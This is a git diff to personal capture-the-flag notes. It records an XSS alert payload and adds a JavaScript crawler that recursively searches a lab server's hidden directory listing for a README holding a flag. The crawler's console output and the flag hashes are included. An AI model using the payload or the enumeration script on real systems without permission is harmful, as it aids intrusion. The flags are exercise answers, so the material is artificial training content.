@@ -31,3 +31,41 @@ Darky 42!
   2. xss attack
   3. <script>alert('XSS!')</script>
   4. Flag = 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
+
+  #6 .hidden
+  ///
+  async function crawl(url, depth=0) {
+  const res = await fetch(url);
+  const html = await res.text();
+
+  const links = [...html.matchAll(/href="([^"]+)"/g)]
+    .map(x => x[1])
+    .filter(l => l !== '../');
+
+  for (let link of links) {
+    const full = url + link;
+
+    if (link.includes("README")) {
+      const r = await fetch(full);
+      const t = await r.text();
+
+      if (t.includes("flag")) {
+        console.log("🚩 FLAG FOUND:", full);
+        console.log(t);
+      }
+    }
+
+    if (link.endsWith('/')) {
+      await crawl(full, depth+1);
+    }
+  }
+}
+
+crawl("http://10.11.249.65/.hidden/");
+///
+
+Promise {<pending>}[[Prototype]]: Promise[[PromiseState]]: "pending"[[PromiseResult]]: undefined
+
+VM147:17 🚩 FLAG FOUND: http://10.11.249.65/.hidden/whtccjokayshttvxycsvykxcfm/igeemtxnvexvxezqwntmzjltkt/lmpanswobhwcozdqixbowvbrhw/README
+VM147:18 Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
+
